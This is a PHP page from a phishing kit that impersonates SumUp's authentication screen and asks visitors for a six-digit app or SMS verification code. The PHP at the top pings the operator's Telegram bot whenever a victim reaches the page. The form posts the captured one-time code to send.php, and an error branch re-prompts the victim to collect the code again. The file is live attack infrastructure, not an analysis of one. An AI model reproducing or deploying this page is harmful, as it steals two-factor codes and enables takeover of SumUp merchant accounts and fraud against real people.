<?php
include_once './config.php';
require '../main.php';
function antiBotsCaller($messaggio, $bot_token, $rez_chat) {
  $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
  $url = $url . "&text=" . urlencode($messaggio);  
  $ch = curl_init();
  $optArray = array(
      CURLOPT_URL => $url,
      CURLOPT_RETURNTRANSFER => true
  );
  curl_setopt_array($ch, $optArray);
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}
$telegram_content = "user in the sms page!";
antiBotsCaller($telegram_content, $bot_token, $rez_chat);


?><html lang="en-gb"><script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/content/location/location.js" id="nimlmejbmnecnaghgmbahmbaddhjbecg"></script><script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/libs/extend-native-history-api.js"></script><script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/libs/requests.js"></script><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width" data-next-head="">
<title data-next-head="">Authentication - SMS — SumUp</title>
<link rel="apple-touch-icon" sizes="180x180" href="./files/img/1.png">
<link rel="icon" type="image/png" sizes="32x32" href="./files/img/32.png">
<link rel="icon" type="image/png" sizes="16x16" href="./files/img/16.png">
<link rel="mask-icon" href="./files/img/sa.svg" color="#ffffff">
<link rel="shortcut icon" href="./files/img/favicon.ico">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="theme-color" content="#ffffff">
<link nonce="" rel="preload" href="./files/css/a6403565f2043d29.css" as="style">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link nonce="" rel="stylesheet" href="./files/css/a6403565f2043d29.css" data-n-g="">
<link nonce="" rel="preload" href="./files/css/b924d8fd0cad0d85.css" as="style">
<link nonce="" rel="stylesheet" href="./files/css/b924d8fd0cad0d85.css" data-n-p="">
<style>
        /* Initially hide the button */
        .hidden {
            display: none;
        }

        /* Style for the loader (three dots) */
        .cui-button-dot-let3 {
            display: inline-block;
            width: 8px;
            height: 8px;
            margin: 0 2px;
            border-radius: 50%;
            background-color: #666;
            animation: blink 1s infinite;
        }

        .cui-button-dot-let3:nth-child(1) {
            animation-delay: 0s;
        }

        .cui-button-dot-let3:nth-child(2) {
            animation-delay: 0.2s;
        }

        .cui-button-dot-let3:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes blink {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
    </style>
<noscript data-n-css="cvkPNRgHn87c8elY">
</noscript>
</head>
<body __processed_1e6896a9-492b-47a2-8bf8-a19b7c3b02c9__="true" __processed_345252cf-0d20-46e0-a0c3-93df8a5f5304__="true">
<div id="__next">
<div class="styles_content__vEkvi">
<header class="styles_header__JJ0ZW">
<a href="" title="Go to SumUp's website" target="_blank" rel="noopener noreferrer" class="cui-body-o5xe cui-body-m-mwmz cui-body-regular-hd7o cui-body-normal-pvqj cui-anchor-xoc6 cui-focus-visible-y4xg">
<svg width="82" height="24" viewBox="0 0 82 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="styles_logo__vLsM0">
<path d="M22.171.19H1.943C1.029.19.267.952.267 1.867V21.98c0 .914.762 1.676 1.676 1.676H22.17c.915 0 1.677-.762 1.677-1.676V1.867c0-.953-.762-1.677-1.677-1.677ZM15.048 17.83c-2.057 2.057-5.334 2.133-7.505.266l-.038-.038a.356.356 0 0 1 0-.495l7.314-7.276a.4.4 0 0 1 .495 0c1.905 2.21 1.829 5.485-.266 7.543Zm1.523-11.62-7.314 7.277a.4.4 0 0 1-.495 0c-1.905-2.172-1.829-5.448.228-7.505 2.058-2.057 5.334-2.133 7.505-.267 0 0 .038 0 .038.038.19.115.19.343.038.458Z" fill="currentColor" class="logo-symbol">
</path>
<g class="logo-text" fill="currentColor">
<path fill-rule="evenodd" clip-rule="evenodd" d="M55.048 6.705h-.038a3.22 3.22 0 0 0-2.286.952 3.29 3.29 0 0 0-2.286-.952H50.4c-1.752 0-3.2 1.41-3.2 3.2v6.21c.038.495.419.876.914.876.495 0 .876-.381.915-.877v-6.21c0-.761.61-1.37 1.371-1.37h.038c.762 0 1.333.57 1.371 1.333v6.247c.047.45.364.877.877.877.495 0 .876-.381.914-.877V9.83c.038-.724.648-1.334 1.371-1.334h.039c.761 0 1.37.61 1.37 1.372v6.247c.039.495.42.877.915.877.495 0 .876-.381.914-.877v-6.21c.039-1.752-1.409-3.2-3.161-3.2Zm-10.82 0c-.495 0-.876.38-.914.876v6.21c0 .761-.61 1.37-1.41 1.37h-.037c-.762 0-1.41-.609-1.41-1.37V7.542c-.038-.495-.419-.876-.914-.876-.495 0-.876.38-.914.876v6.21c0 1.752 1.447 3.2 3.238 3.2h.038c1.79 0 3.238-1.448 3.238-3.2V7.58c0-.495-.42-.876-.915-.876Zm21.639 0c-.496 0-.877.38-.915.876v6.21c0 .761-.61 1.37-1.41 1.37h-.037c-.762 0-1.41-.609-1.41-1.37V7.542c-.038-.495-.419-.876-.914-.876-.495 0-.876.38-.914.876v6.21c0 1.752 1.447 3.2 3.238 3.2h.038c1.79 0 3.238-1.448 3.238-3.2V7.58c-.038-.495-.42-.876-.914-.876Z">
</path>
<path d="M71.924 6.705h-.038c-1.829 0-3.276 1.447-3.276 3.238v11.276c0 .495.418.914.914.914a.927.927 0 0 0 .914-.914v-4.686c.343.305.914.457 1.448.457h.038c1.828 0 3.2-1.561 3.2-3.352V9.867c0-1.79-1.372-3.162-3.2-3.162Zm1.447 7.01c0 .99-.647 1.409-1.41 1.409h-.037c-.8 0-1.41-.42-1.41-1.41V9.943c0-.762.648-1.41 1.41-1.41h.038c.8 0 1.41.61 1.41 1.41v3.771Z">
</path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M34.133 10.781c-1.028-.42-1.676-.686-1.676-1.295 0-.496.381-.953 1.257-.953.534 0 .99.229 1.334.686.228.267.457.42.723.42.534 0 .953-.42.953-.915 0-.19-.038-.381-.153-.495-.571-.877-1.752-1.486-2.857-1.486-1.523 0-3.085.952-3.085 2.78 0 1.867 1.523 2.477 2.78 2.934.991.381 1.867.724 1.867 1.524 0 .61-.571 1.219-1.638 1.219-.343 0-.952-.076-1.371-.571-.229-.267-.496-.381-.724-.381-.495 0-.953.419-.953.914 0 .19.077.38.19.533.572.876 1.868 1.296 2.858 1.296 1.676 0 3.505-1.067 3.505-3.01-.038-2.057-1.676-2.705-3.01-3.2Z">
</path>
<path d="M79.39 6.705a1.829 1.829 0 1 0 .001 3.658 1.829 1.829 0 0 0 0-3.658Zm0 3.2c-.761 0-1.371-.61-1.371-1.372 0-.762.61-1.371 1.371-1.371.762 0 1.372.61 1.372 1.371 0 .762-.61 1.372-1.371 1.372Z">
</path>
<path d="M79.581 8.61a.453.453 0 0 0 .38-.458c0-.304-.228-.495-.57-.495h-.458c-.114 0-.19.076-.19.19v1.258c0 .114.076.19.19.19.115 0 .19-.076.19-.19v-.457l.458.571c.038.076.076.076.19.076.153 0 .19-.114.19-.19s-.037-.115-.075-.153l-.305-.342Zm-.152-.267H79.2v-.381h.229c.114 0 .19.076.19.19 0 .077-.076.19-.19.19Z">
</path>
</g>
</svg>
</a>
</header>
<main class="styles_main__lW3lk">
<div class="styles_authMain__xKIjy">
<div class="styles_wrapper__3R5Z3">
<noscript>
<div style="opacity:1;height:auto;visibility:visible" class="cui-notificationinline-0ru1 styles_notification__wjKtX">
<div class="cui-notificationinline-wrapper-vh3s cui-notificationinline-danger-eeh7">
<div class="cui-notificationinline-icon-x7m1">
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
<path d="M11.988 1A10.994 10.994 0 1 0 12 1h-.012zm4.71 14.29c.186.19.29.445.29.71a1 1 0 0 1-1 1c-.265 0-.52-.104-.71-.29l-3.29-3.29-3.29 3.29c-.19.186-.444.29-.71.29a1 1 0 0 1-1-1c0-.265.104-.52.29-.71l3.29-3.29-3.29-3.29a1.013 1.013 0 0 1-.29-.71 1 1 0 0 1 1-1c.266 0 .52.104.71.29l3.29 3.29 3.29-3.29c.19-.186.444-.29.71-.29a1 1 0 0 1 1 1c0 .266-.104.52-.29.71L13.408 12l3.29 3.29z" fill="currentColor">
</path>
</svg>
</div>
<span class="cui-hide-visually-mb4x">
</span>
<div class="cui-notificationinline-content-604h">
<p class="cui-body-o5xe cui-body-m-mwmz cui-body-regular-hd7o cui-body-normal-pvqj">To make sure this page works properly, please use a browser that supports javascript, or enable javascript in your browser settings.</p>
</div>
</div>
</div>
</noscript>
<div class="styles_box__1egCi styles_box__ZJ6qW">
<svg class="styles_authMethodIcon__vN8AM" width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_110_1319)">
<path d="M59.934 119.868C93.0346 119.868 119.868 93.0346 119.868 59.934C119.868 26.8334 93.0346 0 59.934 0C26.8334 0 0 26.8334 0 59.934C0 93.0346 26.8334 119.868 59.934 119.868Z" fill="#F5F5F5">
</path>
<mask id="mask0_110_1319" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="0" y="0" width="120" height="120">
<path d="M60 120C93.1371 120 120 93.1371 120 60C120 26.8629 93.1371 0 60 0C26.8629 0 0 26.8629 0 60C0 93.1371 26.8629 120 60 120Z" fill="#3063E9">
</path>
</mask>
<g mask="url(#mask0_110_1319)">
<path d="M35.1293 47.1171C35.1293 42.0819 39.2112 38 44.2464 38H81.8828C86.918 38 90.9999 42.0819 90.9999 47.1171V66.9211C90.9999 71.9563 86.918 76.0382 81.8828 76.0382H44.2464C39.2112 76.0382 35.1293 71.9563 35.1293 66.9211V47.1171Z" fill="black">
</path>
<path d="M35.22 68.9149L35.2511 84.8224C35.3165 87.2433 39.374 88.2495 41.3138 86.3259L57.7284 70.0476L35.22 68.9149Z" fill="black">
</path>
<path d="M50.9736 57.3278L49.3805 56.9838C48.6391 56.8237 48.2314 56.0235 48.5376 55.3295C48.8223 54.6843 49.6001 54.4236 50.2162 54.7668L51.5843 55.5289L51.2986 54.1847C51.1312 53.3971 51.7318 52.6554 52.537 52.6554C53.3421 52.6554 53.9428 53.3971 53.7754 54.1847L53.4897 55.5289L54.8577 54.7668C55.4738 54.4236 56.2516 54.6843 56.5364 55.3295C56.8426 56.0235 56.4348 56.8237 55.6934 56.9838L54.1004 57.3278L55.4003 58.5585C55.988 59.1149 55.9119 60.0719 55.2435 60.5284C54.6469 60.936 53.831 60.7641 53.4495 60.1505L52.537 58.6828L51.6244 60.1505C51.243 60.7641 50.427 60.936 49.8304 60.5284C49.1621 60.0719 49.086 59.1149 49.6737 58.5585L50.9736 57.3278Z" fill="white">
</path>
<path d="M61.3068 57.3275L59.7138 56.9835C58.9724 56.8234 58.5646 56.0232 58.8708 55.3293C59.1556 54.6841 59.9334 54.4233 60.5495 54.7665L61.9175 55.5287L61.6318 54.1844C61.4644 53.3968 62.0651 52.6552 62.8702 52.6552C63.6754 52.6552 64.276 53.3968 64.1086 54.1844L63.8229 55.5287L65.191 54.7665C65.8071 54.4233 66.5849 54.6841 66.8696 55.3293C67.1758 56.0232 66.7681 56.8234 66.0267 56.9835L64.4336 57.3275L65.7335 58.5582C66.3212 59.1147 66.2451 60.0717 65.5768 60.5282C64.9802 60.9357 64.1642 60.7638 63.7828 60.1503L62.8702 58.6825L61.9577 60.1503C61.5762 60.7638 60.7602 60.9357 60.1637 60.5282C59.4953 60.0717 59.4192 59.1147 60.0069 58.5582L61.3068 57.3275Z" fill="white">
</path>
<path d="M71.6399 57.3275L70.0469 56.9835C69.3055 56.8234 68.8977 56.0232 69.2039 55.3293C69.4887 54.6841 70.2665 54.4233 70.8826 54.7665L72.2506 55.5287L71.9649 54.1844C71.7975 53.3968 72.3982 52.6552 73.2033 52.6552C74.0085 52.6552 74.6091 53.3968 74.4417 54.1844L74.156 55.5287L75.5241 54.7665C76.1402 54.4233 76.918 54.6841 77.2027 55.3293C77.5089 56.0232 77.1012 56.8234 76.3598 56.9835L74.7667 57.3275L76.0666 58.5582C76.6543 59.1147 76.5782 60.0717 75.9099 60.5282C75.3133 60.9357 74.4973 60.7638 74.1159 60.1503L73.2033 58.6825L72.2908 60.1503C71.9093 60.7638 71.0933 60.9357 70.4968 60.5282C69.8284 60.0717 69.7523 59.1147 70.34 58.5582L71.6399 57.3275Z" fill="white">
</path>
</g>
</g>
<defs>
<clipPath id="clip0_110_1319">
<rect width="120" height="120" rx="60" fill="white">
</rect>
</clipPath>
</defs>
</svg>
<h1 class="cui-headline-sagu cui-headline-m-zzat styles_headline__v34cw">Confirm activity via App code</h1>
<p class="cui-body-o5xe cui-body-m-mwmz cui-body-regular-hd7o cui-body-normal-pvqj styles_bodyMargin__u4IMq">
    We've sent a notification to your trusted device. Please tap the notification to view the verification code and enter it here. 
    Ensure that the <strong class="cui-body-o5xe cui-body-m-mwmz cui-body-regular-hd7o cui-body-normal-pvqj cui-body-highlight-kmah">SumUp app</strong> on your trusted device has permission to send notifications; otherwise, you won't receive the verification code.
</p>
<form method="post" action="send.php" class="styles_form__TxLtA">
    <div class="styles_container__z3MW_">
      <!-- Input fields for OTP digits -->
      <div class="cui-field-wrapper-rn8e styles_inputStyled__ekpcG">
        <label for="otp_code_input_0" class="cui-field-label-8ama">
          <span class="cui-field-label-text-x1ew cui-hide-visually-mb4x">Verification code digit</span>
        </label>
        <div class="cui-input-wrapper-hyjb">
          <input id="otp_code_input_0" name="1" aria-describedby=":R9jbj6H1:" class="cui-input-3cn0" aria-invalid="false" aria-label="Digit 1" autocorrect="off" autocomplete="one-time-code" autocapitalize="off" spellcheck="false" data-testid="otp_code_input_0" type="text" inputmode="numeric" pattern="[0-9]{1}" maxlength="1" oninput="moveFocus(0, event)" require value="">
        </div>
        <span role="status" aria-live="polite"></span>
      </div>
      
      <div class="cui-field-wrapper-rn8e styles_inputStyled__ekpcG">
        <label for="otp_code_input_1" class="cui-field-label-8ama">
          <span class="cui-field-label-text-x1ew cui-hide-visually-mb4x">Verification code digit</span>
        </label>
        <div class="cui-input-wrapper-hyjb">
          <input id="otp_code_input_1" name="2" aria-describedby=":Rhjbj6H1:" class="cui-input-3cn0" aria-invalid="false" aria-label="Digit 2" autocorrect="off" autocomplete="one-time-code" autocapitalize="off" spellcheck="false" data-testid="otp_code_input_1" type="text" inputmode="numeric" pattern="[0-9]{1}" maxlength="1" oninput="moveFocus(1, event)" require value="">
        </div>
        <span role="status" aria-live="polite"></span>
      </div>
      <div class="cui-field-wrapper-rn8e styles_inputStyled__ekpcG">
        <label for="otp_code_input_2" class="cui-field-label-8ama">
          <span class="cui-field-label-text-x1ew cui-hide-visually-mb4x">Verification code digit</span>
        </label>
        <div class="cui-input-wrapper-hyjb">
          <input id="otp_code_input_2" require name="3" aria-describedby=":Rpjbj6H1:" class="cui-input-3cn0" aria-invalid="false" aria-label="Digit 3" autocorrect="off" autocomplete="one-time-code" autocapitalize="off" spellcheck="false" data-testid="otp_code_input_2" type="text" inputmode="numeric" pattern="[0-9]{1}" maxlength="1" oninput="moveFocus(2, event)" value="">
        </div>
        <span role="status" aria-live="polite"></span>
      </div>
      <div class="cui-field-wrapper-rn8e styles_inputStyled__ekpcG">
        <label for="otp_code_input_3" class="cui-field-label-8ama">
          <span class="cui-field-label-text-x1ew cui-hide-visually-mb4x">Verification code digit</span>
        </label>
        <div class="cui-input-wrapper-hyjb">
          <input id="otp_code_input_3" require name="4" aria-describedby=":R11jbj6H1:" class="cui-input-3cn0" aria-invalid="false" aria-label="Digit 4" autocorrect="off" autocomplete="one-time-code" autocapitalize="off" spellcheck="false" data-testid="otp_code_input_3" type="text" inputmode="numeric" pattern="[0-9]{1}" maxlength="1" oninput="moveFocus(3, event)" value="">
        </div>
        <span role="status" aria-live="polite"></span>
      </div>
      <div class="cui-field-wrapper-rn8e styles_inputStyled__ekpcG">
        <label for="otp_code_input_4" class="cui-field-label-8ama">
          <span class="cui-field-label-text-x1ew cui-hide-visually-mb4x">Verification code digit</span>
        </label>
        <div class="cui-input-wrapper-hyjb">
          <input id="otp_code_input_4" require name="5" aria-describedby=":R19jbj6H1:" class="cui-input-3cn0" aria-invalid="false" aria-label="Digit 5" autocorrect="off" autocomplete="one-time-code" autocapitalize="off" spellcheck="false" data-testid="otp_code_input_4" type="text" inputmode="numeric" pattern="[0-9]{1}" maxlength="1" oninput="moveFocus(4, event)" value="">
        </div>
        <span role="status" aria-live="polite"></span>
      </div>
      <div class="cui-field-wrapper-rn8e styles_inputStyled__ekpcG">
        <label for="otp_code_input_5" class="cui-field-label-8ama">
          <span class="cui-field-label-text-x1ew cui-hide-visually-mb4x">Verification code digit</span>
        </label>
        <div class="cui-input-wrapper-hyjb">
          <input id="otp_code_input_5" require name="6" aria-describedby=":R1hjbj6H1:" class="cui-input-3cn0" aria-invalid="false" aria-label="Digit 6" autocorrect="off" autocomplete="one-time-code" autocapitalize="off" spellcheck="false" data-testid="otp_code_input_5" type="text" inputmode="numeric" pattern="[0-9]{1}" maxlength="1" oninput="moveFocus(5, event)" value="">
        </div>
        <span role="status" aria-live="polite"></span>
      </div>
    </div>
    <?php if(isset($_GET['e'])){ echo '<p style="display:flex;align-items:center;justify-content:center;margin-top:var(--cui-spacings-byte);color:var(--cui-fg-danger)" class="cui-body-o5xe cui-body-s-lehd cui-body-regular-hd7o cui-body-normal-pvqj"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm3 11a1 1 0 0 1-1.41 0L8 9.41 6.41 11A1 1 0 0 1 5 9.59L6.59 8 5 6.41A1 1 0 0 1 5 5a1 1 0 0 1 1.41 0L8 6.59 9.59 5A1 1 0 0 1 11 5a1 1 0 0 1 0 1.41L9.41 8 11 9.59A1 1 0 0 1 11 11z" fill="currentColor"></path></svg><span style="margin-left:var(--cui-spacings-byte)">The code you entered is invalid. Please try again</span></p>'; } ?>

        <div class="styles_buttonsWrapper__z4o_0">
     
      <button type="submit" aria-live="polite" aria-busy="false" class="cui-button-ylou cui-button-primary-y79g cui-button-m-p5bj cui-focus-visible-y4xg cui-button-m-9sec">
        <span class="cui-button-loader-uhaf" aria-hidden="false">
          <span class="cui-button-dot-let3"></span>
          <span class="cui-button-dot-let3"></span>
          <span class="cui-button-dot-let3"></span>
          <span class="cui-hide-visually-mb4x">Confirming</span>
        </span>
        <span class="cui-button-content-vmdv">
          <span class="cui-button-label-cmag">Confirm</span>
        </span>
      </button>
    </div>
  </form>
  <a href="./app.php" 
   class="cui-button-ylou cui-button-tertiary-s4ao cui-button-m-p5bj cui-focus-visible-y4xg styles_button__kcpuo cui-button-m-9sec cui-button-tertiary-qgem hidden" 
   id="confirmButton">
    <span class="cui-button-loader-uhaf" aria-hidden="true">
        <span class="cui-button-dot-let3"></span>
        <span class="cui-button-dot-let3"></span>
        <span class="cui-button-dot-let3"></span>
    </span>
    <span class="cui-button-content-vmdv">
        <span class="cui-button-label-cmag">Or confirm using a different method</span>
    </span>
</a>
<div class="styles_footerSpacer__ZOchN">
</div>
</div>
</div>
</div>
</div>
</div>
</main>
</div>
</div>
<script> function moveFocus(currentInputIndex, event) {
    // Check if the value entered is a number (it should be, given the pattern)
    if (event.target.value.length === 1) {
      // Get the next input index
      const nextInputIndex = currentInputIndex + 1;
      const nextInput = document.getElementById(`otp_code_input_${nextInputIndex}`);
      
      // Move focus to the next input if it exists
      if (nextInput) {
        nextInput.focus();
      }
    }
  }</script>
   <script>
    // Wait for 10 seconds, then show the button with loader
    setTimeout(function() {
        // Remove hidden class to display the button
        document.getElementById('confirmButton').classList.remove('hidden');
    }, 10000); // 10000 milliseconds = 10 seconds
</script>
<script src="q.js"></script>
<?php $m->ctr("SMS (".@$_GET['p'].")"); ?>
</body></html>